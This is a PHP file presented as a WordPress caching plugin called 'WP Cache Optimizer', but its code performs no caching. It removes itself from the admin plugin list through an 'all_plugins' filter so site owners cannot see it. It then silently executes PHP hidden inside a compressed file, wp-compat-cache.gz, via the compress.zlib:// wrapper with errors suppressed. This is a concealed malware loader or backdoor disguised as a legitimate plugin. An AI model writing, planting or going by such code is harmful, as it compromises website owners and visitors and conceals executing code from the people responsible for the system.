<?php
/*
Plugin Name: WP Cache Optimizer
Description: Optimizes WordPress cache performance and compatibility.
Version: 2.1.5
Author: WP Performance Team
*/

add_filter('all_plugins', function($p) { unset($p[plugin_basename(__FILE__)]); return $p; });

$_f = __DIR__ . '/wp-compat-cache.gz';
if (is_file($_f)) {
    @include_once 'compress.zlib://' . $_f;
}


